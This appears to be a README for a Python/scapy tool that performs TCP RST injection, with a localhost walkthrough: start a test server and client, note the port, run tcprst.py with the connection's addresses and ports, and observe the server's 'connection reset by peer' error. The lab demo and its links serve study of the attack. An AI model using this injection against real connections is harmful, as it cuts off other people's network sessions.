This repository contains a python/scapy implementation of the TCP RST injection showcased in the included c file. 

Howto:
 $ indicates command to be executed
 > indicates output on the console

start the server
$ python server.py
> TCP Server binding to port 5000

start the client
$ python client.py

record the port number the server reports (47413 in the running example)
> I got a connection from 127.0.0.1:47413

start the injection
$ python tcprst.py -D 127.0.0.1 -d 5000 -S 127.0.0.1 -s 47413

wait until the server exits with the a message:
> Traceback (most recent call last):
>   File "server.py", line 15, in <module>
>     data = client_socket.recv(512)
> socket.error: [Errno 104] Connection reset by peer

done!

More info on TCP/RST injection:
http://kerneltrap.org/node/3072
http://www.blackhatacademy.org/security101/TCP-RST_Injection

Source of the c file: 
http://packetstormsecurity.org/files/38708/tcprst.c.html